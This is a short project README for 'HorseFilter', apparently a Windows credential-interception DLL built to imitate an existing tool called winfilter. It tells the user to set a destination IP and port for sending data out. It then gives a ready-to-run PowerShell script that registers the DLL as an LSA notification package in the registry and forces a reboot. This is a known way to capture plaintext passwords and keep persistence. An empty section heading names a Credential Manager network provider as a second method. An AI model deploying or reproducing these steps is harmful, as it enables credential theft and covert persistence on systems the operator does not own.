# HorseFilter
- i basically wanted to learn how [winfilter](https://github.com/kindtime/winfilter) works so i made this
- update destination port and IP macros in `shared/horsefilter.h`
- update file metadata in `shared/horsefilter.rc`
- i recommend compiling on linux with mingw-w64


## LSA Notification Package
1. place DLL anywhere in PATH
2. append DLL name (no extension) to registry key
3. reboot
```ps1
$DLLName = "horsefilter"

$Path = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$Value = "Notification Packages"

$Current = Get-ItemProperty -Path $Path -Name $Value
$New = $Current."$Value" + $DLLName

Set-ItemProperty -Path $Path -Name $Value -Value $New
Restart-Computer -Force
```

## Credential Manager Network Provider

